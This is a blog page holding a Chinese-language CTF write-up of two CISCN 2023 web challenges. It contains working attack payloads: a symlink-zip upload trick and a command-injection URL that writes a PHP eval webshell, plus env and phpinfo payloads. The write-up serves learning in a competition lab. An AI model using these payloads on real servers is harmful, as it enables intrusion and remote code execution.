@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="关于本次国赛可以说暴露了很多问题，学的知识点太少了很多题根本没思路，全程只有misc输出，web唯一本来应该能做出来的SQL坐牢一天掉进自己的思维定式里面的，狠狠的被出题人坑傻了。最后无缘复赛，也没什么好遗憾的，实力如此，就是有点对不起队友和工作室，给他们丢脸了呜呜呜！ 所以从现在开始决定花更多心思在CTF上了  CTF不是web的全部，但我永远不会忘记哪些熬夜做招新题的夜晚······   u">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ciscn-2023-web-部分writeup">
+<meta property="og:url" content="http://p5ych2022.github.io/2023/06/02/ciscn-2023-web-%E9%83%A8%E5%88%86writeup/index.html">
+<meta property="og:site_name" content="psych&#39;s blog">
+<meta property="og:description" content="关于本次国赛可以说暴露了很多问题，学的知识点太少了很多题根本没思路，全程只有misc输出，web唯一本来应该能做出来的SQL坐牢一天掉进自己的思维定式里面的，狠狠的被出题人坑傻了。最后无缘复赛，也没什么好遗憾的，实力如此，就是有点对不起队友和工作室，给他们丢脸了呜呜呜！ 所以从现在开始决定花更多心思在CTF上了  CTF不是web的全部，但我永远不会忘记哪些熬夜做招新题的夜晚······   u">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/Untitled.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/Untitled1.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-1024x460.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/Untitled-1-1024x396.png">
+<meta property="article:published_time" content="2023-06-02T09:05:00.000Z">
+<meta property="article:modified_time" content="2023-08-16T15:11:48.199Z">
+<meta property="article:author" content="psych">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/Untitled.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ciscn-2023-web-部分writeup</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Article</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/06/06/%E8%A6%81%E7%AA%92%E6%81%AF%E4%BA%86%EF%BC%8C%E4%BD%86%E6%98%AF%E6%83%B3%E7%86%AC%E8%BF%87%E5%8E%BB/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/05/22/python-spider/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://p5ych2022.github.io/2023/06/02/ciscn-2023-web-%E9%83%A8%E5%88%86writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://p5ych2022.github.io/2023/06/02/ciscn-2023-web-%E9%83%A8%E5%88%86writeup/&text=ciscn-2023-web-部分writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://p5ych2022.github.io/2023/06/02/ciscn-2023-web-%E9%83%A8%E5%88%86writeup/&title=ciscn-2023-web-部分writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://p5ych2022.github.io/2023/06/02/ciscn-2023-web-%E9%83%A8%E5%88%86writeup/&is_video=false&description=ciscn-2023-web-部分writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ciscn-2023-web-部分writeup&body=Check out this article: http://p5ych2022.github.io/2023/06/02/ciscn-2023-web-%E9%83%A8%E5%88%86writeup/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://p5ych2022.github.io/2023/06/02/ciscn-2023-web-%E9%83%A8%E5%88%86writeup/&title=ciscn-2023-web-部分writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://p5ych2022.github.io/2023/06/02/ciscn-2023-web-%E9%83%A8%E5%88%86writeup/&title=ciscn-2023-web-部分writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://p5ych2022.github.io/2023/06/02/ciscn-2023-web-%E9%83%A8%E5%88%86writeup/&title=ciscn-2023-web-部分writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://p5ych2022.github.io/2023/06/02/ciscn-2023-web-%E9%83%A8%E5%88%86writeup/&title=ciscn-2023-web-部分writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://p5ych2022.github.io/2023/06/02/ciscn-2023-web-%E9%83%A8%E5%88%86writeup/&name=ciscn-2023-web-部分writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://p5ych2022.github.io/2023/06/02/ciscn-2023-web-%E9%83%A8%E5%88%86writeup/&t=ciscn-2023-web-部分writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E6%9C%AC%E6%AC%A1%E5%9B%BD%E8%B5%9B"><span class="toc-number">1.</span> <span class="toc-text">关于本次国赛</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unzip"><span class="toc-number">2.</span> <span class="toc-text">unzip</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83"><span class="toc-number">2.1.</span> <span class="toc-text">题目环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#silly%E7%9A%84wp"><span class="toc-number">2.2.</span> <span class="toc-text">silly的wp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dumpit"><span class="toc-number">3.</span> <span class="toc-text">dumpit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9D%E5%AE%A1"><span class="toc-number">3.1.</span> <span class="toc-text">初审</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="toc-number">3.2.</span> <span class="toc-text">我的思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E8%A7%A3"><span class="toc-number">3.3.</span> <span class="toc-text">正解</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ciscn-2023-web-部分writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">psych</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-06-02T09:05:00.000Z" class="dt-published" itemprop="datePublished">2023-06-02</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web/">web</a> › <a class="category-link" href="/categories/web/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/web/" rel="tag">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <hr>
+<h2 id="关于本次国赛"><a href="#关于本次国赛" class="headerlink" title="关于本次国赛"></a>关于本次国赛</h2><p>可以说暴露了很多问题，学的知识点太少了很多题根本没思路，全程只有misc输出，web唯一本来应该能做出来的SQL坐牢一天掉进自己的思维定式里面的，狠狠的被出题人坑傻了。最后无缘复赛，也没什么好遗憾的，实力如此，就是有点对不起队友和工作室，给他们丢脸了呜呜呜！</p>
+<p>所以从现在开始决定花更多心思在CTF上了</p>
+<blockquote>
+<p>CTF不是web的全部，但我永远不会忘记哪些熬夜做招新题的夜晚······</p>
+</blockquote>
+<hr>
+<h2 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h2><p>💚 有一个参看文件： <a target="_blank" rel="noopener" href="https://forum.butian.net/share/906">https://forum.butian.net/share/906</a></p>
+<hr>
+<h3 id="题目环境"><a href="#题目环境" class="headerlink" title="题目环境"></a>题目环境</h3><p>题目给出源码，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> error_reporting(0);</span><br><span class="line"> highlight_file(__FILE__);</span><br><span class="line"> ​</span><br><span class="line"> $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line"> if (finfo_file($finfo, $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]) === &#x27;application/zip&#x27;)&#123;</span><br><span class="line">     exec(&#x27;cd /tmp &amp;&amp; unzip -o &#x27; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);</span><br><span class="line"> &#125;;</span><br><span class="line"> ​</span><br><span class="line"> //only this!</span><br></pre></td></tr></table></figure>
+
+<p>然后有一个文件上传的接口。</p>
+<hr>
+<p>做题分析</p>
+<p>根据参考文章</p>
+<ul>
+<li>首先上传zip这个应该是不用改的，有比较强的验证，而且后面也有unzip的操作，所以应该就是上传zip文件了</li>
+<li><code>cd /tmp &amp;&amp; unzip -o</code>应该是解题的关键，参考文章里面也有提到，看他的做法涉及到软连接，去看看。</li>
+<li>发现软链接配合zip文件上传可是实现任意文件读取</li>
+<li>而<code>unzip -o</code>是<code>不必先询问用户，unzip执行后覆盖原有的文件</code> -o参数目前猜测可能只是为了方便选手重复上传一样的名字的压缩包，所以关键是这个解压缩操作，配合软链接，也就是会执行软链接去任意文件读取</li>
+<li>原来<code>-o</code> 的用处是，先上传一个软链接的压缩包指向王炸根目录，然后再上传一个同样名称的压缩包包含webshell，然后访问,就造成rce了</li>
+</ul>
+<hr>
+<p>上传该exp1.zip解压出里边的文件也是软连接<code>/var/www/html</code>目录下。接下来的思路就是想办法构造一个gethsell文件让gethsell文件正好解压在<code>/var/www/html</code>此时就可以getshell。</p>
+<p>构造第二个压缩包，我们先创建一个files目录(因为上一个压缩包里边目录就是files)，在files目录下写一个shell文件，在压缩创建的files目录 此时压缩包目录架构是：<code>test/shell.php.</code>当我们上传这个压缩包时会覆盖上一个目录，但是files目录软链接指向<code>/var/www/html</code> 。解压的时候会把<code>shell.php</code>放在<code>/var/www/html</code>，此时我们达到了getsehll的目的</p>
+<hr>
+<h3 id="silly的wp"><a href="#silly的wp" class="headerlink" title="silly的wp"></a>silly的wp</h3><p>zip可以打包软链接，首先创建一个指向&#x2F;var&#x2F;www&#x2F;html的软连接</p>
+<p>然后将软连接压缩打包，为exp1.zip</p>
+<p>上传到服务器解压，此时tmp目录就有一个指向&#x2F;var&#x2F;www&#x2F;html的软连接</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/Untitled.png"></p>
+<p>删掉files软连接，创一个files文件夹，里面放一个webshell</p>
+<p>压缩files，得到压缩包，exp2.zip</p>
+<p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/Untitled1.png"></p>
+<p>服务器里解压，此时访问&#x2F;files&#x2F;shell.php发现文件存在，webshell工具连接即可</p>
+<hr>
+<h2 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a>dumpit</h2><p>题目环境</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use ?db=&amp;table_2_query= or ?db=&amp;table_2_dump= to view the tables! etc:?db=ctf&amp;table_2_query=flag1</span><br></pre></td></tr></table></figure>
+
+<h3 id="初审"><a href="#初审" class="headerlink" title="初审"></a>初审</h3><ul>
+<li>题目提示flag在&#x2F;flag</li>
+<li>先访问<code>?db=ctf&amp;table_2_query=flag1</code> flag1到5都访问了，提示让rce一个flag，初步猜测是SQL注入写文件getshell…</li>
+<li>query赛道构造的语句是：<ul>
+<li>select * from ctf.flag1</li>
+<li>尝试构造查询其他表：</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from information_schema.global_variables where VARIABLE_NAME=&#x27;secure_file_priv&#x27;</span><br><span class="line">array(4) &#123; [&quot;VARIABLE_NAME&quot;]=&gt; string(16) &quot;SECURE_FILE_PRIV&quot; [0]=&gt; string(16) &quot;SECURE_FILE_PRIV&quot; [&quot;VARIABLE_VALUE&quot;]=&gt; string(0) &quot;&quot; [1]=&gt; string(0) &quot;&quot; &#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现<code>secure_file_priv</code> 为空，是可以写文件的。</p>
+<ul>
+<li>继续查看题目环境是否有写文件权限：简单输入一些查询语句，发现是没有读写权限的，，当时就在这里纠结了很久</li>
+</ul>
+<h3 id="我的思路"><a href="#我的思路" class="headerlink" title="我的思路"></a>我的思路</h3><ul>
+<li><code>http://eci-2zehs7fgoxn8owsdgy7q.cloudeci1.ichunqiu.com:8888/?db=ctf&amp;table_2_query=flag1 where 1=1 and 1=2</code> 把后面的1&#x3D;2改成一个bool判断句，题目会返回查询结果或者bool(false)，利用这里的bool判断进行bool盲注</li>
+</ul>
+<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-1024x460.png" style="zoom:50%;" />
+
+<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/Untitled-1-1024x396.png" style="zoom:50%;" />
+
+<ul>
+<li>但是这里跑了一下，length函数是可以用的，但是load_file全是FALSE，TIM佬当时就说了可能没有load_file也就是没有file权限，但是我不信邪呜呜呜，结果真的没有啊啊啊</li>
+<li>当时在这里卡了很久，总想尝试load_file去读&#x2F;flag的内容，换各种bool语句，十六编码，结果就是坐牢一天。。</li>
+</ul>
+<h3 id="正解"><a href="#正解" class="headerlink" title="正解"></a>正解</h3><ul>
+<li>一开始发现了题目进行了一些过滤，比如<code>;</code>被过滤了，就没想过编码绕过啥的。。</li>
+<li>事实上，直接用<code>%0a</code> 进行编码绕过。</li>
+<li>然后就是这个题目使用了dump进行备份，但是mysql并没有自带的dump相关函数，所以它一定是调用了系统命令进行dump的，所以一些管道符还有<code>;</code>什么的都是可以尝试的，最后也可以使用exec进行命令执行，由于题目没有回显，所以考虑使用一句话木马到文件。</li>
+<li>在写的时候发现过滤了$，可以通过<strong>协议头</strong>获取rce参数。ls没问题，cat可能由于权限问题得不到flag。</li>
+<li>后来发现env环境变量中有flag信息，可能是生成靶机动态Flag的时候将Flag写入了环境变量。。。。。。。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;http://xxx/?db=ctf&amp;table_2_dump=flag1%0Aecho%20%22%3C?php%20@eval(getallheaders()[%27Cookie%27]&gt;)?%3E%22%20%3E%20%22/app/log/1.php%22%0A</span><br><span class="line"># echo &quot;&lt;?php eval(getallheaders()[&#x27;Cookie&#x27;])?&gt;&quot; &gt; &quot;/app/log/1.php&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>或者直接<code>?db=-r &quot;1.php&quot; &quot;&lt;?=eval(phpinfo()) ?&gt;&quot;&amp;table_2_dump=flag1</code> PHPinfo中查看环境变量get flag。</li>
+<li>或者直接<code>?db=ctf&amp;table_2_dump=%0Aenv</code></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Article</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E6%9C%AC%E6%AC%A1%E5%9B%BD%E8%B5%9B"><span class="toc-number">1.</span> <span class="toc-text">关于本次国赛</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unzip"><span class="toc-number">2.</span> <span class="toc-text">unzip</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83"><span class="toc-number">2.1.</span> <span class="toc-text">题目环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#silly%E7%9A%84wp"><span class="toc-number">2.2.</span> <span class="toc-text">silly的wp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dumpit"><span class="toc-number">3.</span> <span class="toc-text">dumpit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9D%E5%AE%A1"><span class="toc-number">3.1.</span> <span class="toc-text">初审</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="toc-number">3.2.</span> <span class="toc-text">我的思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E8%A7%A3"><span class="toc-number">3.3.</span> <span class="toc-text">正解</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://p5ych2022.github.io/2023/06/02/ciscn-2023-web-%E9%83%A8%E5%88%86writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://p5ych2022.github.io/2023/06/02/ciscn-2023-web-%E9%83%A8%E5%88%86writeup/&text=ciscn-2023-web-部分writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://p5ych2022.github.io/2023/06/02/ciscn-2023-web-%E9%83%A8%E5%88%86writeup/&title=ciscn-2023-web-部分writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://p5ych2022.github.io/2023/06/02/ciscn-2023-web-%E9%83%A8%E5%88%86writeup/&is_video=false&description=ciscn-2023-web-部分writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ciscn-2023-web-部分writeup&body=Check out this article: http://p5ych2022.github.io/2023/06/02/ciscn-2023-web-%E9%83%A8%E5%88%86writeup/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://p5ych2022.github.io/2023/06/02/ciscn-2023-web-%E9%83%A8%E5%88%86writeup/&title=ciscn-2023-web-部分writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://p5ych2022.github.io/2023/06/02/ciscn-2023-web-%E9%83%A8%E5%88%86writeup/&title=ciscn-2023-web-部分writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://p5ych2022.github.io/2023/06/02/ciscn-2023-web-%E9%83%A8%E5%88%86writeup/&title=ciscn-2023-web-部分writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://p5ych2022.github.io/2023/06/02/ciscn-2023-web-%E9%83%A8%E5%88%86writeup/&title=ciscn-2023-web-部分writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://p5ych2022.github.io/2023/06/02/ciscn-2023-web-%E9%83%A8%E5%88%86writeup/&name=ciscn-2023-web-部分writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://p5ych2022.github.io/2023/06/02/ciscn-2023-web-%E9%83%A8%E5%88%86writeup/&t=ciscn-2023-web-部分writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2024
+    psych
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Article</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
